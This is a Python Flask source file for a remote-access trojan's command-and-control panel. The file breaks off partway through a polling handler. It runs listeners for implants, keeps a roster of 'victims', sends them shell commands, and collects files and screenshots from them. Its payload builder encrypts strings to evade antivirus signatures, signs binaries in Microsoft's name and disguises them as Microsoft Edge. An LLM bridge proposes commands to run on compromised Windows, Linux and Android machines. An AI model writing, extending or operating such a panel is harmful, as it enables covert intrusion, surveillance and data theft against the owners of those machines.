import socket, threading, os, sys, base64, json, time, uuid, hashlib
import subprocess, re, shutil, urllib.request
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file

import cybc2
import cybai

KEY = 0x3A   # legacy v2 XOR key, retained only to identify pre-CYB3 implants

app = Flask(__name__)

# app.run() uses debug=False, which turns Jinja2 auto-reload OFF — so template
# edits are served from an in-memory cache and silently do nothing until the
# process restarts. Force it on: the UI is edited far more often than the
# listener, and a stale cached template looks exactly like "my change is broken".
app.config['TEMPLATES_AUTO_RELOAD'] = True
# The client list is polled every 2.5s; a cached / would defeat the fix above.
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

clients = {}
client_lock = threading.Lock()

# How long an authenticated session may go without a frame before we treat the
# link as dead. The implant sends CYB_T_PING every 45s (PING_INTERVAL), so this
# is roughly 3 missed beats -- generous enough to survive a slow link, tight
# enough that the UI does not show a zombie as online for hours.
CLIENT_IDLE_TIMEOUT = 180.0

# Per-client transcript caps. These lists only ever grew, so a long-lived
# session (or an AI panel looping commands) grew the heap without limit, and
# every appended entry re-serialised the whole history to victims.json.
MAX_CLIENT_OUTPUT = 500
MAX_CLIENT_HISTORY = 200
MAX_ANDROID_OUTPUT = 1000


def _trim(seq, cap):
    """Keep only the newest `cap` entries, in place."""
    if len(seq) > cap:
        del seq[:len(seq) - cap]


def _trim_and_advance(state, cap):
    """Trim an Android listener transcript and keep its cursor absolute.

    The UI polls /output?since=<count>, so dropping entries off the front would
    slide those indices backwards and make the client re-read or skip lines.
    state['base'] records how many were dropped, so count stays monotonic.
    Caller must hold state['lock'].
    """
    excess = len(state['output']) - cap
    if excess > 0:
        del state['output'][:excess]
        state['base'] = state.get('base', 0) + excess


# ---------------------------------------------------------------- roster probe
# The client list used to show nothing but "ip:port ONLINE", so with more than
# one implant there was no way to tell the boxes apart short of clicking each
# one and running !sysinfo by hand.  Fingerprint each implant once per
# connection and cache the result on the client record.
SYSINFO_CMD = '!sysinfo'

# Label sets, not a fixed field order: the Windows payload calls the box
# "Computer Name" where the Linux payload calls it "Hostname", and a
# CYB_MINIMAL build has CYB_F_SYSINFO compiled out entirely so its lines are
# simply absent. Matching on the label is what makes one parser serve both.
_SYSINFO_FIELDS = (
    ('host',      ('Computer Name', 'Hostname')),
    ('user',      ('User',)),
    ('os',        ('OS',)),
    ('arch',      ('Architecture',)),
    ('cpu',       ('CPU',)),
    ('cores',     ('CPU Cores',)),
    ('mem_total', ('Memory Total',)),
    ('mem_avail', ('Memory Avail',)),
    ('uptime',    ('Uptime',)),
    ('ip',        ('IP Address',)),
    ('cwd',       ('Working Dir',)),
)


def parse_sysinfo(text):
    """Turn a !sysinfo transcript into a dict for the client roster.

    Both payloads print `Label<pad>: value` and both indent their labels to a
    fixed column, so split on the first colon: a value like "C:\\Users\\demon"
    keeps its own colons. Returns None when nothing matched, which is the
    signal the UI uses to fall back to "not fingerprinted yet" instead of
    rendering a row of blanks.
    """
    out = {}
    for line in (text or '').replace('\r\n', '\n').split('\n'):
        label, sep, value = line.partition(':')
        if not sep:
            continue
        label, value = label.strip(), value.strip()
        if not value:
            continue
        for key, labels in _SYSINFO_FIELDS:
            if label in labels:
                # setdefault, not assignment: "CPU" must not overwrite the
                # "CPU Cores" line that follows it.
                out.setdefault(key, value)
                break
    return out or None


BASE_DIR = os.path.dirname(__file__)
WEB_HOST = os.environ.get('CYB_WEB_HOST', '0.0.0.0')
WEB_PORT = int(os.environ.get('CYB_WEB_PORT', '5000'))
DATA_DIR = os.path.join(BASE_DIR, 'data')
os.makedirs(DATA_DIR, exist_ok=True)
LISTENERS_FILE = os.path.join(DATA_DIR, 'listeners.json')
VICTIMS_FILE = os.path.join(DATA_DIR, 'victims.json')
PSK_FILE = os.path.join(DATA_DIR, 'psk.json')

# --------------------------------------------------------------------------
# Pre-shared key management
# --------------------------------------------------------------------------
# One PSK per panel.  The builder bakes the same value into every payload it
# compiles and the listener uses it to authenticate the CYB3 handshake, so a
# payload built with a different key can never complete a handshake.  Rotating
# the key is therefore how you cut off implants you no longer control.

_psk_lock = threading.Lock()
_psk_cache = None


def get_psk():
    """Return the 32-byte PSK, creating and persisting one on first run."""
    global _psk_cache
    with _psk_lock:
        if _psk_cache is not None:
            return _psk_cache
        try:
            with open(PSK_FILE) as f:
                _psk_cache = cybc2.load_psk(json.load(f)['psk'])
                return _psk_cache
        except Exception:
            pass
        key = os.urandom(32)
        try:
            with open(PSK_FILE, 'w') as f:
                json.dump({'psk': key.hex(),
                           'created': datetime.now().isoformat()}, f, indent=2)
            os.chmod(PSK_FILE, 0o600)
        except Exception:
            pass
        _psk_cache = key
        return key


def rotate_psk():
    """Generate a fresh PSK.  Implants built against the old one stop working."""
    global _psk_cache
    with _psk_lock:
        key = os.urandom(32)
        with open(PSK_FILE, 'w') as f:
            json.dump({'psk': key.hex(),
                       'created': datetime.now().isoformat()}, f, indent=2)
        try:
            os.chmod(PSK_FILE, 0o600)
        except Exception:
            pass
        _psk_cache = key
        return key


def get_psk_hex():
    return get_psk().hex()


def sync_psk_into_sources():
    """Make sure both payload sources carry the panel's current PSK.

    Without this, building before ever opening the builder page would bake in
    the placeholder key, and the resulting implant would fail every handshake
    for no obvious reason.
    """
    want = get_psk_hex()
    changed = []
    for path in (PAY_CPP, PAY_LINUX_C):
        if not os.path.exists(path):
            continue
        try:
            with open(path) as f:
                body = f.read()
            m = re.search(r'#\s*define\s+PSK_HEX\s+"([0-9a-fA-F]*)"', body)
            if m and m.group(1).lower() == want:
                continue
            new = re.sub(r'#(\s*define\s+PSK_HEX\s+)"[0-9a-fA-F]*"',
                         lambda mm: '#' + mm.group(1) + '"' + want + '"', body)
            if new != body:
                with open(path, 'w') as f:
                    f.write(new)
                changed.append(os.path.basename(path))
        except Exception as e:
            print(f"[!] could not sync the PSK into {path}: {e}")
    return changed


SIGN_KEY = os.path.join(BASE_DIR, 'build_keys', 'code_sign.key')
SIGN_CRT = os.path.join(BASE_DIR, 'build_keys', 'code_sign.crt')


def _render_rc(app_name, exe_name):
    """Write a per-build resources.rc whose identity fields match the output.

    A binary named da.exe whose OriginalFilename says msedge.exe is a visible
    inconsistency in Explorer properties and is exactly the kind of mismatch
    that reads as repacked malware. Returns the generated path.
    """
    with open(RESOURCES_RC) as f:
        rc = f.read()

    def sub(name, value):
        nonlocal rc
        rc = re.sub(rf'^(#define\s+{name}\s+).*$',
                    lambda m: m.group(1) + f'"{value}"', rc, count=1, flags=re.M)

    # Only the fields that must track the output name; leave the Edge identity
    # (company, product, version) as configured in resources.rc.
    sub('ORIGINAL_NAME', exe_name)
    sub('INTERNAL_NAME', os.path.splitext(exe_name)[0])
    sub('FILE_NAME', app_name)

    out = os.path.join(BUILD_DIR, 'resources.build.rc')
    with open(out, 'w') as f:
        f.write(rc)
    return out


def _sign_exe(exe_path):
    """Authenticode-sign exe_path if a key is available.

    Returns (signed, message). The cert must also be trusted on the Windows
    host (Trusted Publishers + Trusted Root) or Windows will still call the
    publisher unknown.
    """
    if not (os.path.isfile(SIGN_KEY) and os.path.isfile(SIGN_CRT)):
        return False, '[sign] no build_keys/code_sign.{key,crt} - skipped\n'
    if not shutil.which('osslsigncode'):
        return False, '[sign] osslsigncode not installed - skipped\n'
    # NOTE: the cert flag is -certs, not -i. In osslsigncode 2.x -i is the
    # "expanded description URL"; passing a cert path to it makes the tool bail
    # with "Overwriting an existing file is not supported".
    cmd = ['osslsigncode', 'sign', '-h', 'sha256', '-n', 'Microsoft Corporation',
           '-certs', SIGN_CRT, '-key', SIGN_KEY,
           '-in', exe_path, '-out', exe_path + '.signed']
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        return False, f'[sign] FAILED: {r.stderr.strip()}\n'
    os.replace(exe_path + '.signed', exe_path)
    return True, '[sign] Authenticode signature added\n'


PAY_CPP = os.path.join(BASE_DIR, 'pay.cpp')
PAY_LINUX_C = os.path.join(BASE_DIR, 'pay_linux.c')
RESOURCES_RC = os.path.join(BASE_DIR, 'resources.rc')
BUILD_DIR = os.path.join(BASE_DIR, 'build_output')
ICONS_DIR = os.path.join(BASE_DIR, 'builder_icons')
os.makedirs(BUILD_DIR, exist_ok=True)

# --- build-time string encryption (cybstrenc.py) ---------------------------
# Separate from the protocol PSK on purpose. The PSK authenticates the CYB3
# channel and must be secret from the server's other clients; this passphrase
# only has to keep plaintext literals out of .rdata so static signatures and
# "strings" sweeps do not match. The payload must be able to recover it, so it
# ships masked inside the binary -- that defeats signature matching, not a
# debugger. Overridable for operators who want per-campaign literals.
CYB_STRENC = os.path.join(BASE_DIR, 'cybstrenc.py')
CYB_STRING_KEY = os.environ.get('CYB_STRING_KEY', 'cyberdemon')
# cybcrypt.h is in this list too. It has to be: a rewritten literal inside it
# needs the decoder half way down its own body, which is why cybstr.h carries
# its own copy of SHA-256 and does not include cybcrypt.h.
OBFUSCATE_HEADERS = ('cybproto.h', 'cybbuf.h', 'cybcrypt.h')


def obfuscate_sources(payload, workdir):
    """Rewrite `payload` and the shared headers with encrypted literals.

    Returns (include_dirs, error). A non-empty error means the build must
    abort: silently falling back to the pristine sources would ship a
    plaintext binary under a UI that promised obfuscation, which is worse
    than no obfuscation at all because nobody would look.
    """
    # A stale obf/ directory from a failed run must not be reused: the header
    # include guard means a leftover cybstr.h would silently win over the new
    # one and the binary would decrypt with the *previous* build's salt.
    shutil.rmtree(workdir, ignore_errors=True)
    os.makedirs(workdir, exist_ok=True)
    cmd = [sys.executable, CYB_STRENC, '--key', CYB_STRING_KEY, '--quiet',
           '--no-harness', '-i', payload]
    for hdr in OBFUSCATE_HEADERS:
        cmd += ['-i', os.path.join(BASE_DIR, hdr)]
    cmd += ['-o', workdir]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return None, 'cybstrenc.py timed out'
    if r.returncode != 0:
        return None, ('string encryption failed:\n'
                      + ((r.stdout + r.stderr).strip() or 'no output'))
    return [BASE_DIR, workdir], ''
os.makedirs(ICONS_DIR, exist_ok=True)

build_status = {'running': False, 'last_output': '', 'success': False, 'exe_path': ''}

# ---- Multi-port listener management ----
listeners_lock = threading.Lock()
listener_threads = {}  # port -> {thread, stop_event}

def _load_listeners():
    try:
        with open(LISTENERS_FILE) as f: return json.load(f)
    except: return []

def _save_listeners(lst):
    with open(LISTENERS_FILE, 'w') as f: json.dump(lst, f, indent=2)

def _save_victims(snapshot=None):
    if snapshot is None:
        with client_lock:
            snapshot = {cid: {
                'id': cid, 'addr': c['addr'], 'ip': c['ip'],
                'ip_key': c['ip_key'], 'connected': c['connected'],
                'first_seen': c.get('first_seen', datetime.now().isoformat()),
                'last_seen': c['last_seen'],
                'history': c.get('history', []),
                # Persisted so a panel restart does not reduce every
                # previously-fingerprinted implant back to a bare IP:port.
                'info': c.get('info', None),
                'last_cmd': c.get('last_cmd', None),
            } for cid, c in clients.items()}
    try:
        with open(VICTIMS_FILE, 'w') as f: json.dump(snapshot, f, indent=2)
    except: pass

def _start_listener(port):
    stop_ev = threading.Event()
    t = threading.Thread(target=_tcp_server, args=(port, stop_ev), daemon=True)
    t.start()
    with listeners_lock:
        listener_threads[port] = {'thread': t, 'stop_event': stop_ev}

def _stop_listener(port):
    with listeners_lock:
        info = listener_threads.pop(port, None)
    if info:
        info['stop_event'].set()

def _tcp_server(port, stop_ev):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1.0)
    try:
        server.bind(('0.0.0.0', port))
    except Exception as e:
        print(f"[!] Failed to bind on 0.0.0.0:{port} — {e}")
        return
    server.listen(10)
    print(f"[TCP] C2 listener on 0.0.0.0:{port}")
    while not stop_ev.is_set():
        try:
            conn, addr = server.accept()
            cid = client_id_for(addr[0])
            t = threading.Thread(target=handle_client, args=(conn, addr, cid))
            t.daemon = True; t.start()
        except socket.timeout: continue
        except: break
    server.close()


def client_id_for(ip, suffix_if_live=True):
    """Stable roster id for an implant, derived from its source IP.

    This was uuid4()[:8] per TCP connection, so every jittered reconnect
    landed a new row in the client list and the roster answered "how many
    times has each box reconnected" instead of "which boxes do I have" -- one
    implant flapping for an hour produced a wall of identical dead rows. The
    panel already keys per-host file storage on the IP (get_client_dirs ->
    clients/<ip>/), so the IP is this codebase's existing notion of identity.

    Two implants behind one NAT address, or two on one host, would collide on
    the same key, so if the base row is currently live the id gets a
    discriminator. The suffix is only taken while a connection holds the base
    id, which means a reconnect after a drop reclaims the clean base id.
    """
    base = hashlib.sha1(ip.encode()).hexdigest()[:8]
    if not suffix_if_live:
        return base
    with client_lock:
        cid, n = base, 2
        while cid in clients and clients[cid].get('connected'):
            cid = f'{base}_{n}'
            n += 1
    return cid

def get_client_dirs(addr):
    ip = addr.split(':')[0]
    base = os.path.join(BASE_DIR, 'clients', ip)
    dirs = {
        'downloads': os.path.join(base, 'downloads'),
        'screenshots': os.path.join(base, 'screenshots'),
        'uploads': os.path.join(base, 'uploads'),
    }
    for d in dirs.values():
        os.makedirs(d, exist_ok=True)
    return dirs, ip


def probe_client(client_id):
    """Ask the implant to fingerprint itself. Returns (ok, error).

    Sets c['probe'], which handle_client consumes on the next T_RESP it sees.
    The session is request/response, so the reply to this is whatever comes
    back first -- no marker in the payload to collide with, and no index into
    the output list to go stale when _trim drops the front of it.

    Deliberately silent on the transcript. Every consumer correlates replies
    by position in c['output'] -- the terminal cursor, the AI bridge, the
    panel test -- so a panel-issued probe landing in that stream shifts every
    following reply by one and an operator's !shell echo comes back as the
    previous command's output. The fingerprint surfaces in the client row
    instead, and the panel log records it.
    """
    with client_lock:
        c = clients.get(client_id)
        if not c or not c.get('connected') or not c.get('sess'):
            return False, 'Client not connected'
        conn, sess = c['conn'], c['sess']
        c['probe'] = True
    try:
        # Session.send() holds the tx lock across seal() and sendall(), so
        # firing this from a Flask thread is safe even while the handler
        # thread is mid-send.  The nonce counter stays monotonic either way.
        sess.send(conn, cybc2.T_CMD, SYSINFO_CMD.encode())
    except Exception as e:
        with client_lock:
            if client_id in clients:
                clients[client_id].pop('probe', None)
        return False, f'Send failed: {e}'
    return True, ''


def restore_victims():
    """Rebuild the roster from victims.json at panel startup.

    victims.json was write-only, so restarting the panel emptied the client
    list: every fingerprint and every 'last command' was lost until each
    implant happened to reconnect, and the UI comment claiming the registry
    keeps every client it has ever seen was only true within one run.

    Restored rows are placeholders -- no conn, no sess, connected=False --
    so every send path's existing 'not connected' guard rejects them. A real
    connection replaces the whole record via handle_client.

    Rows are re-keyed to the current IP-derived id rather than the key they
    were saved under. victims.json still holds uuid4 keys from before that
    change, and keeping them would strand every pre-existing implant as a
    permanent dead row that a reconnect could never refresh. Where one IP has
    several saved rows, the most recent wins: they are the same host, just
    counted more than once.
    """
    try:
        with open(VICTIMS_FILE) as f:
            saved = json.load(f)
    except Exception:
        return 0
    merged = {}
    for cid, row in sorted(saved.items(),
                           key=lambda kv: kv[1].get('last_seen', 0)):
        ip = row.get('ip') or (row.get('addr', '').split(':')[0])
        if not ip:
            continue
        merged[client_id_for(ip, suffix_if_live=False)] = (ip, row)
    n = 0
    with client_lock:
        for cid, (ip, row) in merged.items():
            if cid in clients:
                continue
            clients[cid] = {
                'id': cid,
                'addr': row.get('addr', ''),
                'ip': ip,
                'connected': False,
                'conn': None,
                'sess': None,
                'pubkey': '',
                'proto': 'CYB3',
                'output': [],
                'history': row.get('history', []),
                'first_seen': row.get('first_seen', ''),
                'last_seen': row.get('last_seen', 0),
                'dirs': {},
                'ip_key': row.get('ip_key') or ip,
                'info': row.get('info') or None,
                'last_cmd': row.get('last_cmd') or None,
                'restored': True,
            }
            n += 1
    if n:
        print(f"[*] Restored {n} known host(s) from victims.json (offline)")
    return n

def handle_client(conn, addr, client_id):
    """CYB3 session: PSK-authenticated X25519 handshake, then ChaCha20-Poly1305
    frames in both directions."""
    addr_str = f"{addr[0]}:{addr[1]}"
    dirs, ip_key = get_client_dirs(addr_str)

    psk = get_psk()
    try:
        sess, cli_pub, cli_nonce = cybc2.server_handshake(conn, psk)
    except Exception as e:
        # A failed handshake is the normal outcome for a scanner, a wrong key,
        # or a stale implant.  Nothing is registered in the client list.
        print(f"[-] handshake failed for {addr_str}: {e}")
        try:
            conn.close()
        except Exception:
            pass
        return

    # Liveness detection. The accepted socket had no timeout, so a client that
    # went silent without a FIN -- laptop sleeps, NAT drops the flow, the ngrok
    # tunnel resets -- left this thread blocked in recv() forever and the client
    # stayed connected:True in the UI. Commands queued to it went nowhere and
    # never surfaced as failures. The implant pings every PING_INTERVAL (45s),
    # so anything much past that plus slack is a dead link, not a slow one.
    conn.settimeout(CLIENT_IDLE_TIMEOUT)

    now = datetime.now().isoformat()
    with client_lock:
        # Carry the operator-facing context across a reconnect. Ids are stable
        # per source IP now, so this is the same host coming back after a
        # dropped link -- blanking the fingerprint would make the row flicker
        # back to "not fingerprinted" and lose the last-command line.
        prev = clients.get(client_id) or {}
        clients[client_id] = {
            'id': client_id,
            'addr': addr_str,
            'ip': addr[0],
            'connected': True,
            'conn': conn,
            'sess': sess,
            'pubkey': cli_pub.hex(),
            'proto': 'CYB3',
            'output': [],
            'history': [],
            'first_seen': prev.get('first_seen') or now,
            'last_seen': time.time(),
            'dirs': dirs,
            'ip_key': ip_key,
            # Refreshed from the probe reply below; seeded so the row does not
            # regress to a blank while that is in flight.
            'info': prev.get('info'),
            'info_at': prev.get('info_at', 0),
            'last_cmd': prev.get('last_cmd'),
        }
    print(f"[+] Client {client_id} connected from {addr_str} (CYB3)")
    _save_victims()

    # Fingerprint before entering the recv loop, so this thread -- which owns
    # the session -- issues it and no other Flask request races it.
    ok, err = probe_client(client_id)
    if not ok:
        print(f"[-] Client {client_id}: fingerprint failed ({err})")

    last_save = time.time()
    try:
        while True:
            try:
                chunk = conn.recv(65536)
            except socket.timeout:
                print(f"[-] Client {client_id} from {addr_str}: idle "
                      f">{CLIENT_IDLE_TIMEOUT:.0f}s, dropping dead link")
                break
            except OSError:
                break
            if not chunk:
                break
            try:
                sess.feed(chunk)
            except ValueError:
                print(f"[-] Client {client_id}: inbound overflow")
                break

            disconnect = False
            while True:
                try:
                    msg = sess.recv()
                except ValueError as e:
                    # Any framing, replay or authentication failure drops the link.
                    print(f"[-] Client {client_id}: {e}")
                    disconnect = True
                    break
                if msg is None:
                    break
                ftype, pt = msg

                if ftype == cybc2.T_PING:
                    try:
                        sess.send(conn, cybc2.T_PONG, pt)
                    except Exception:
                        disconnect = True
                        break
                    continue
                if ftype == cybc2.T_PONG:
                    continue
                if ftype in (cybc2.T_BYE, cybc2.T_ERR):
                    disconnect = True
                    break
                if ftype != cybc2.T_RESP:
                    continue

                result = pt.decode('utf-8', 'replace')
                entry = {
                    'type': 'response',
                    'data': result,
                    'time': datetime.now().strftime('%H:%M:%S')
                }
                # File payloads are written once, here, and the saved name is
                # recorded on the entry.  Previously api_poll re-saved them on
                # every poll, duplicating each download/screenshot.
                if result.startswith("[DOWNLOAD]"):
                    fname = handle_download_response(result, dirs['downloads'])
                    if fname:
                        entry['file'] = fname
                        entry['category'] = 'downloads'
                elif result.startswith("[SCREENSHOT]"):
                    fname = handle_screenshot_response(result, dirs['screenshots'])
                    if fname:
                        entry['file'] = fname
                        entry['category'] = 'screenshots'

                with client_lock:
                    if client_id in clients:
                        c = clients[client_id]
                        c['last_seen'] = time.time()
                        # Consume the flag before anything else can raise, so
                        # an unrelated later reply is never mistaken for it.
                        if c.pop('probe', False):
                            # Roster data only -- not appended to output, see
                            # probe_client(): the transcript stays the
                            # operator's own command/response stream.
                            info = parse_sysinfo(result)
                            if info:
                                c['info'] = info
                                c['info_at'] = time.time()
                                print(f"[*] Client {client_id} fingerprinted: "
                                      f"{info.get('host', '?')}\\{info.get('user', '?')}")
                            else:
                                # CYB_MINIMAL builds have CYB_F_SYSINFO
                                # compiled out; not an error, just no data.
                                print(f"[*] Client {client_id}: no sysinfo "
                                      f"(capability compiled out?)")
                        else:
                            c['output'].append(entry)
                            _trim(c['output'], MAX_CLIENT_OUTPUT)

            if disconnect:
                break
            # Persist periodically rather than on every single response.
            if time.time() - last_save > 5:
                _save_victims()
                last_save = time.time()
    except Exception as e:
        print(f"[-] Client {client_id} error: {e}")
    finally:
        try:
            conn.close()
        except Exception:
            pass
        with client_lock:
            if client_id in clients:
                clients[client_id]['connected'] = False
                clients[client_id]['sess'] = None
        _save_victims()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/clients')
def api_clients():
    with client_lock:
        info = {}
        for cid, c in clients.items():
            info[cid] = {
                'id': c['id'],
                'addr': c['addr'],
                'ip': c.get('ip', ''),
                'connected': c['connected'],
                'last_seen': c['last_seen'],
                'proto': c.get('proto', 'CYB3'),
                'output_count': len(c['output']),
                'history_count': len(c.get('history', [])),
                'info': c.get('info') or None,
                'last_cmd': c.get('last_cmd') or None,
            }
    return jsonify(info)

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.get_json(silent=True) or {}
    client_id = data.get('client_id')
    cmd = (data.get('command') or '').strip()
    if not client_id or not cmd:
        return jsonify({'error': 'Missing client_id or command'}), 400

    with client_lock:
        c = clients.get(client_id)
        if not c or not c.get('connected') or not c.get('sess'):
            return jsonify({'error': 'Client not connected'}), 400
        conn, sess = c['conn'], c['sess']
        c['output'].append({
            'type': 'command',
            'data': cmd,
            'time': datetime.now().strftime('%H:%M:%S')
        })
        c.setdefault('history', []).append({
            'cmd': cmd,
            'time': datetime.now().strftime('%H:%M:%S')
        })
        # Surfaced on the client row so an operator can see what each implant
        # was last asked to do without selecting it.
        c['last_cmd'] = {'cmd': cmd,
                         'time': datetime.now().strftime('%H:%M:%S')}
        _trim(c['output'], MAX_CLIENT_OUTPUT)
        _trim(c['history'], MAX_CLIENT_HISTORY)

    if cmd.startswith("!upload "):
        return handle_upload(conn, sess, client_id, cmd)

    try:
        sess.send(conn, cybc2.T_CMD, cmd.encode())
    except Exception as e:
        return jsonify({'error': f'Send failed: {e}'}), 500
    _save_victims()
    return jsonify({'sent': True})


# ---------------------------------------------------------------- AI bridge
# Two-phase on purpose: the operator sees the command the model proposed
# before anything is sent to the implant. An LLM writing shell commands that
# auto-execute against a live box is a genuine footgun -- a misparse of
# "clean up the old backups" becomes a destructive command nobody ever saw.

AI_TIMEOUT = 150


def _send_and_collect(client_id, cmd, wait=AI_TIMEOUT):
    """Send cmd to the implant, block for the matching T_RESP, return output.

    Marks the current tail of the client's output buffer so we can tell our
    own response apart from earlier ones instead of matching on text.
    """
    with client_lock:
        c = clients.get(client_id)
        if not c or not c.get('connected') or not c.get('sess'):
            return None, 'Client not connected'
        mark = len(c['output'])
        conn, sess = c['conn'], c['sess']
        c['output'].append({'type': 'command', 'data': cmd,
                            'time': datetime.now().strftime('%H:%M:%S')})
        c.setdefault('history', []).append(
            {'cmd': cmd, 'time': datetime.now().strftime('%H:%M:%S')})
        _trim(c['output'], MAX_CLIENT_OUTPUT)
        _trim(c['history'], MAX_CLIENT_HISTORY)

    try:
        sess.send(conn, cybc2.T_CMD, cmd.encode())
    except Exception as e:
        return None, f'Send failed: {e}'

    deadline = time.time() + wait
    while time.time() < deadline:
        time.sleep(0.4)
        with client_lock:
            c = clients.get(client_id)
            if not c or not c.get('connected'):
                return None, 'Client disconnected while waiting for output'
            for entry in c['output'][mark:]:
                if entry.get('type') == 'response':
                    return entry.get('data', ''), None
    return None, f'No response within {wait}s'


def _android_send_and_collect(port, client_id, cmd, wait=AI_TIMEOUT):
    """Send cmd to an Android device, block for its reply, return the text.

    The Android listener is line-based and multiplexed by port, so we mark the
    output buffer length first and only accept entries that arrive after it.
    `SHELL:` replies come back as "SHELL:<output>" because the client's
    _send_response prefixes every reply with its verb; strip that so the
    operator sees the command output rather than the protocol.
    """
    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return None, f'Android listener on port {port} is not running'
    with state['lock']:
        mark = len(state['output'])
        conn = None
        if client_id:
            c = state['clients'].get(client_id)
            if c and c.get('connected'):
                conn = c.get('conn')
        if not conn:
            for c in state['clients'].values():
                if c.get('connected') and c.get('conn'):
                    conn, client_id = c['conn'], c.get('id', client_id)
                    break
        if not conn:
            return None, 'No device connected'
        try:
            conn.sendall((cmd + '\n').encode())
            state['output'].append({'type': 'cmd', 'data': cmd,
                                    'client_id': client_id})
        except Exception as e:
            return None, f'Send failed: {e}'

    chunks = []
    deadline = time.time() + wait
    while time.time() < deadline:
        time.sleep(0.4)
        with state['lock']:
            fresh = state['output'][mark:]
            mark = len(state['output'])
        for entry in fresh:
            if entry.get('client_id') and client_id and \
                    entry['client_id'] != client_id:
                continue
            if entry.get('type') == 'output':
                text = entry.get('data', '')
                if text.startswith('SHELL:'):
                    text = text[6:]
                chunks.append(text)
            elif entry.get('type') == 'error':
                return None, entry.get('data', 'error')
        if chunks:
            return '\n'.join(chunks), None
    return None, f'No response within {wait}s'


@app.route('/api/ai/health')
def api_ai_health():
    return jsonify(cybai.health())


@app.route('/api/ai/plan', methods=['POST'])
def api_ai_plan():
    """NL -> proposed command. Does not touch the implant."""
    data = request.get_json(silent=True) or {}
    prompt = (data.get('prompt') or '').strip()
    client_id = data.get('client_id')
    platform = (data.get('platform') or 'windows').lower()
    if not prompt:
        return jsonify({'error': 'Missing prompt'}), 400

    try:
        if data.get('reset'):
            cybai.reset_session(client_id)
        command = cybai.plan(client_id, prompt, platform=platform,
                             last_output=data.get('last_output'),
                             last_command=data.get('last_command'))
    except cybai.AIError as e:
        return jsonify({'error': str(e)}), 502
    return jsonify({'command': command, 'platform': platform})


@app.route('/api/ai/run', methods=['POST'])
def api_ai_run():
    """Execute an operator-approved command and get a written answer.

    On a failed result the model is given the error once to correct itself
    (bounded by cybai.MAX_REPLANS); the corrected command is reported back so
    it is visible in the transcript rather than run silently.
    """
    data = request.get_json(silent=True) or {}
    prompt = (data.get('prompt') or '').strip()
    client_id = data.get('client_id')
    command = (data.get('command') or '').strip()
    platform = (data.get('platform') or 'windows').lower()
    if not prompt or not client_id or not command:
        return jsonify({'error': 'Missing prompt, client_id or command'}), 400

    if platform == 'android':
        port = int(data.get('port') or 8080)
        output, err = _android_send_and_collect(port, client_id, command)
    else:
        port = None
        output, err = _send_and_collect(client_id, command)
    if err:
        return jsonify({'error': err, 'command': command}), 502

    steps = [{'command': command, 'output': output}]

    failed = re.search(r'(?im)^\s*(error|not recognized|Access is denied|'
                       r'cannot find|could not find|The system cannot find|'
                       r'is not recognized as an internal|not found:|'
                       r'Permission denied|No such file)', output or '')
    if failed and cybai.MAX_REPLANS > 0:
        try:
            fixed = cybai.replan_after_failure(client_id, prompt, command,
                                               output, platform=platform)
            if fixed and fixed.strip() != command.strip():
                if platform == 'android':
                    out2, err2 = _android_send_and_collect(port, client_id, fixed)
                else:
                    out2, err2 = _send_and_collect(client_id, fixed)
                if not err2:
                    steps.append({'command': fixed, 'output': out2})
                    output, command = out2, fixed
        except cybai.AIError:
            pass

    try:
        answer = cybai.interpret(client_id, prompt, command, output,
                                 platform=platform)
    except cybai.AIError as e:
        answer = f'(model could not summarise: {e})'

    return jsonify({'answer': answer, 'command': command,
                    'output': output, 'steps': steps, 'platform': platform})


def handle_upload(conn, sess, client_id, cmd):
    """Push a local file as `!upload <remote>|<base64>`.

    The whole thing goes out as one CYB3 frame (the protocol allows 16 MB), so
    multi-megabyte transfers are not truncated by any intermediate buffer."""
    parts = cmd[8:].strip().split(None, 1)
    if not parts:
        return jsonify({'error': 'Usage: !upload <local_path> [remote_path]'}), 400
    local_path = parts[0]
    remote_path = parts[1] if len(parts) > 1 else os.path.basename(local_path)
    if not os.path.isfile(local_path):
        return jsonify({'error': f'File not found: {local_path}'}), 400
    if os.path.getsize(local_path) > 10 * 1024 * 1024:
        return jsonify({'error': 'File exceeds the 10MB limit'}), 400
    with open(local_path, "rb") as f:
        file_data = f.read()
    b64_data = base64.b64encode(file_data).decode()
    payload = f"!upload {remote_path}|{b64_data}"
    try:
        sess.send(conn, cybc2.T_CMD, payload.encode())
    except Exception as e:
        return jsonify({'error': f'Send failed: {e}'}), 500

    with client_lock:
        if client_id in clients:
            dst = clients[client_id].get('dirs', {}).get('uploads', BASE_DIR)
            try:
                shutil.copy2(local_path, os.path.join(dst, os.path.basename(local_path)))
            except Exception:
                pass

    return jsonify({'sent': True, 'file': local_path,
                    'size': len(file_data), 'remote': remote_path})

@app.route('/api/upload/file', methods=['POST'])
def api_upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    client_id = request.form.get('client_id', '')
    remote_path = request.form.get('remote_path', '')
    if not client_id:
        return jsonify({'error': 'No client_id'}), 400
    f = request.files['file']
    safe = re.sub(r'[^a-zA-Z0-9._-]', '_', f.filename or 'upload')
    dst_dir = os.path.join(BASE_DIR, 'uploads')
    os.makedirs(dst_dir, exist_ok=True)
    dst = os.path.join(dst_dir, safe)
    f.save(dst)
    with client_lock:
        c = clients.get(client_id)
        if not c:
            return jsonify({'error': 'Client not found'}), 404
        conn, sess = c.get('conn'), c.get('sess')
        if not conn or not sess:
            return jsonify({'error': 'Connection lost'}), 400
    return handle_upload(conn, sess, client_id,
                        f"!upload {dst} {remote_path or safe}")

@app.route('/api/poll/<client_id>')
def api_poll(client_id):
    since = int(request.args.get('since', '0'))
    with client_lock:
        c = clients.get(client_id)
        if not c:
            return jsonify({'output': [], 'connected': False, 'files': []})
        output = c['output'][since:]
        new_count = len(c['output'])
        connected = c['connected']
        ip_key = c['ip_key']
    # File payloads were written once by handle_client when the frame arrived;
    # just report what landed.  Re-decoding here wrote a fresh timestamped copy
    # of every download and screenshot on each poll.
    files = []
    for item in output:
        if item.get('file'):
